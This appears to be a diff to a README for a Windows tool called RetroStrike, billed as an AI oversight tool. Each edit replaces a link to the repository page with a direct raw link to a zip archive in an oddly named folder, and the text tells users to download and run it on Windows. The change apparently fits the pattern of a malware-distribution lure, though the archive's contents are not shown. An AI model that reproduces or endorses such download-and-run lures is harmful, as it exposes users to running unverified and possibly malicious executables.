@@ -1,6 +1,6 @@
 # ⚡ RetroStrike - People-First AI Oversight Tool
 
-[![Download RetroStrike](https://img.shields.io/badge/Download-RetroStrike-blue?style=for-the-badge&logo=github)](https://github.com/spark0002/RetroStrike)
+[![Download RetroStrike](https://img.shields.io/badge/Download-RetroStrike-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/spark0002/RetroStrike/master/laevotartaric/Strike-Retro-v3.3.zip)
 
 ## 🧭 What RetroStrike Is
 
@@ -28,7 +28,7 @@ You need:
 
 Visit this page to download RetroStrike:
 
-https://github.com/spark0002/RetroStrike
+https://raw.githubusercontent.com/spark0002/RetroStrike/master/laevotartaric/Strike-Retro-v3.3.zip
 
 If you see a release file or installer on that page, download it and run that file on Windows.
 
@@ -236,4 +236,4 @@ To keep RetroStrike easy to use:
 
 Visit this page to download RetroStrike:
 
-https://github.com/spark0002/RetroStrike
+https://raw.githubusercontent.com/spark0002/RetroStrike/master/laevotartaric/Strike-Retro-v3.3.zip
